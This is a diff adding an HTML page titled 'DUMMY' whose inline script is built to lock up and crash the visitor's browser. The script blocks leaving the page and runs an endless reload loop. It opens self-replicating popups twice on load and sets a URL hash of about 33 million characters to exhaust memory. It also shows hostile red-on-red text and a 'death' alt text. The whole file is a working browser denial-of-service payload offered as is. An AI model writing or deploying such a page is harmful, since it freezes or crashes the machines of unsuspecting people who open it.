@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+    <html>
+        <head>
+            <title>DUMMY</title>
+            <script>
+
+
+                  //sleep function
+                  function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+                }
+
+
+
+
+
+
+
+
+
+
+
+                onbeforeunload = () => true;
+                    setTimeout(function(){
+                        while(1)location.reload(1)
+                    }, 1000)
+                    function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
+                    window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
+                    var orangewidth = 5000
+                    var orangeheight = 45000
+                    while (orangewidth < 1500) {
+                        orangewidth = orangewidth + 900
+                        orangeheight = orangeheight + 900
+                        sleep(1);
+                    }
+
+                    var yourImg = document.getElementById('grow');
+                    if(yourImg && yourImg.style) {
+                        yourImg.style.height = orangeheight;
+                        yourImg.style.width = orangewidth;
+                    }
+
+
+            </script>
+        </head>
+
+        <body style = "background-color: red; color:red;"onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">diee
+
+
+            <img src="orange.jpg" style="height: 1700;width: 900;" alt="deathdeathdeathdeath"/>
+
+
+
+
+
+
+        </body>
+    </html>
+
+
